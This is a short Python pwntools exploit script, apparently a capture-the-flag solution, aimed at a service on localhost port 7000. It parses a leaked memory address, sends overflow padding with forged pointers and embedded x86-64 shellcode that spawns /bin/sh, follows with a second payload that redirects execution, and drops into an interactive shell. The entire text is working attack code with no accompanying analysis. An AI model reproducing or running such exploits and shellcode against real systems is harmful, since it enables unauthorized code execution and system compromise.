from pwn import *
p = remote("127.0.0.1", 7000)

p.recvuntil(b"You are currently speaking to ")
mmap_addr = p.recvline().strip()
mmap_addr = int(mmap_addr, 16)
print(hex(mmap_addr))
p.clean()

pad = 0x68
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

shellcode = b'a'*pad + p64(mmap_addr+8+pad) + p64(mmap_addr+16+pad) + shellcode

p.sendline(shellcode)

log.info(hex(mmap_addr+len(shellcode)-8))
p.clean()
payload = b'a'*0x80+p64(mmap_addr+pad)[:-2]
#log.info(payload)
p.sendline(payload)
p.clean()
p.interactive()
